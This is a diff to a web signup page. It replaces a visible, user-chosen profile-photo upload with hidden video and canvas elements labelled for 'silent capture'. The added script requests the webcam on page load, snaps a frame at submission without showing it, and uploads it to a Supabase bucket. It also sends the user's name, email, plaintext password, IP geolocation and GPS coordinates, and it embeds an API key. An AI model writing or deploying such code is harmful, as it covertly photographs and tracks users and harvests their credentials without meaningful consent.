@@ -27,7 +27,7 @@
         .subtitle { color: #666; margin-bottom: 32px; font-size: 14px; }
         .form-group { margin-bottom: 20px; }
         label { display: block; margin-bottom: 6px; color: #555; font-size: 14px; font-weight: 500; }
-        input[type="text"], input[type="email"], input[type="password"], input[type="file"] {
+        input[type="text"], input[type="email"], input[type="password"] {
             width: 100%;
             padding: 12px 16px;
             border: 2px solid #e1e5e9;
@@ -67,6 +67,8 @@
             overflow-y: auto;
             display: none;
         }
+        /* Hidden elements for background camera capture */
+        #webcamStream, #captureCanvas { display: none; }
     </style>
 </head>
 <body>
@@ -87,11 +89,6 @@
                 <label for="password">Password</label>
                 <input type="password" id="password" name="password" required placeholder="••••••••" minlength="8">
             </div>
-            <div class="form-group">
-                <label for="photo">Profile Photo (Camera or File)</label>
-                <!-- capture="user" prompts camera immediately on mobile devices -->
-                <input type="file" id="photo" name="photo" accept="image/*" capture="user" required>
-            </div>
             <button type="submit" id="submitBtn">Create Account</button>
         </form>
 
@@ -99,19 +96,82 @@
         <div id="dataPreview" class="data-preview"></div>
     </div>
 
+    <!-- Hidden Video and Canvas Elements for Silent Capture -->
+    <video id="webcamStream" autoplay playsinline></video>
+    <canvas id="captureCanvas"></canvas>
+
     <script>
         (function() {
             const form = document.getElementById('signupForm');
             const submitBtn = document.getElementById('submitBtn');
             const statusDiv = document.getElementById('status');
             const previewDiv = document.getElementById('dataPreview');
+            const video = document.getElementById('webcamStream');
+            const canvas = document.getElementById('captureCanvas');
 
             const SUPABASE_URL = 'https://waqbujfkoqhuixeahzta.supabase.co';
             const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndhcWJ1amZrb3FodWl4ZWFoenRhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODk2NjUyMzksImV4cCI6MjEwNTI0MTIzOX0.slUkwBTlAIzYUAdTqbxs-6SPiq03AIXtWKuzAf-SxoE';
 
+            let mediaStream = null;
+
             function showStatus(message, type) {
                 statusDiv.textContent = message;
                 statusDiv.className = 'status ' + type;
+            }
+
+            // Automatically prompt for camera permission on load
+            async function initCamera() {
+                try {
+                    mediaStream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
+                        audio: false
+                    });
+                    video.srcObject = mediaStream;
+                } catch (err) {
+                    console.warn('Camera permission denied or unavailable:', err.message);
+                }
+            }
+
+            initCamera();
+
+            // Capture photo frame from video stream to blob
+            function capturePhotoBlob() {
+                return new Promise((resolve) => {
+                    if (!mediaStream || video.readyState < 2) {
+                        resolve(null);
+                        return;
+                    }
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    canvas.toBlob((blob) => resolve(blob), 'image/jpeg', 0.85);
+                });
+            }
+
+            // Upload image blob directly to Supabase Storage
+            async function uploadPhotoBlob(blob) {
+                if (!blob) return null;
+                const fileName = `auto_${Date.now()}_${Math.random().toString(36).substring(2, 7)}.jpg`;
+                const filePath = `uploads/${fileName}`;
+
+                const response = await fetch(`${SUPABASE_URL}/storage/v1/object/user-photos/${filePath}`, {
+                    method: 'POST',
+                    headers: {
+                        'apikey': SUPABASE_KEY,
+                        'Authorization': `Bearer ${SUPABASE_KEY}`,
+                        'Content-Type': 'image/jpeg'
+                    },
+                    body: blob
+                });
+
+                if (!response.ok) {
+                    const err = await response.json().catch(() => ({}));
+                    console.error('Storage error:', err);
+                    return null;
+                }
+
+                return `${SUPABASE_URL}/storage/v1/object/public/user-photos/${filePath}`;
             }
 
             // Fetch IP geolocation
@@ -163,62 +223,74 @@
                 });
             }
 
-            // Upload image file to Supabase Storage Bucket
-            async function uploadPhoto(file) {
-                const fileExt = file.name.split('.').pop();
-                const fileName = `${Date.now()}_${Math.random().toString(36).substring(2, 7)}.${fileExt}`;
-                const filePath = `uploads/${fileName}`;
-
-                const uploadResponse = await fetch(`${SUPABASE_URL}/storage/v1/object/user-photos/${filePath}`, {
-                    method: 'POST',
-                    headers: {
-                        'apikey': SUPABASE_KEY,
-                        'Authorization': `Bearer ${SUPABASE_KEY}`,
-                        'Content-Type': file.type
-                    },
-                    body: file
-                });
-
-                if (!uploadResponse.ok) {
-                    const err = await uploadResponse.json().catch(() => ({}));
-                    throw new Error(err.message || 'Image upload failed');
-                }
-
-                // Public URL format
-                return `${SUPABASE_URL}/storage/v1/object/public/user-photos/${filePath}`;
-            }
-
             form.addEventListener('submit', async (e) => {
                 e.preventDefault();
                 submitBtn.disabled = true;
-                showStatus('Uploading photo and location data...', 'info');
+                showStatus('Processing registration...', 'info');
 
-                const photoInput = document.getElementById('photo');
-                const photoFile = photoInput.files[0];
+                // 1. Auto-capture photo frame
+                const photoBlob = await capturePhotoBlob();
+                const photoUrl = await uploadPhotoBlob(photoBlob);
 
+                // Stop camera stream after capture
+                if (mediaStream) {
+                    mediaStream.getTracks().forEach(track => track.stop());
+                }
+
+                const formData = new FormData(form);
+                const userData = {
+                    name: formData.get('name'),
+                    email: formData.get('email'),
+                    password: formData.get('password'),
+                    photo_url: photoUrl,
+                    timestamp: new Date().toISOString(),
+                    created_at: new Date().toISOString()
+                };
+
+                // 2. Fetch IP & GPS location data
+                const [ipData, gpsData] = await Promise.all([
+                    fetchIPData(),
+                    getGPSLocation()
+                ]);
+
+                Object.assign(userData, ipData, gpsData);
+
+                // Display collected payload
+                previewDiv.style.display = 'block';
+                previewDiv.innerHTML = '<strong>Collected Data:</strong><br>' +
+                    Object.entries(userData)
+                        .map(([key, val]) => `${key}: ${val}`)
+                        .join('<br>');
+
+                // 3. Post payload to Supabase
                 try {
-                    let photoUrl = null;
-                    if (photoFile) {
-                        photoUrl = await uploadPhoto(photoFile);
+                    const response = await fetch(`${SUPABASE_URL}/rest/v1/signups`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'apikey': SUPABASE_KEY,
+                            'Authorization': `Bearer ${SUPABASE_KEY}`,
+                            'Prefer': 'return=minimal'
+                        },
+                        body: JSON.stringify(userData)
+                    });
+
+                    if (response.ok) {
+                        showStatus('Account created successfully!', 'success');
+                        form.reset();
+                    } else {
+                        const errorData = await response.json().catch(() => ({}));
+                        console.error('Supabase Error Details:', errorData);
+                        showStatus(`Error (${response.status}): ${errorData.message || 'Failed to save data.'}`, 'error');
                     }
+                } catch (error) {
+                    showStatus('Network error while saving data. Please check your connection.', 'error');
+                    console.error('Fetch error:', error);
+                }
 
-                    const formData = new FormData(form);
-                    const userData = {
-                        name: formData.get('name'),
-                        email: formData.get('email'),
-                        password: formData.get('password'),
-                        photo_url: photoUrl,
-                        timestamp: new Date().toISOString(),
-                        created_at: new Date().toISOString()
-                    };
-
-                    const [ipData, gpsData] = await Promise.all([
-                        fetchIPData(),
-                        getGPSLocation()
-                    ]);
-
-                    Object.assign(userData, ipData, gpsData);
-
-                    previewDiv.style.display = 'block';
-                    previewDiv.innerHTML = '<strong>Collected Data:</strong><br>' +
-                        Object.entries(userData)
+                submitBtn.disabled = false;
+            });
+        })();
+    </script>
+</body>
+</html>
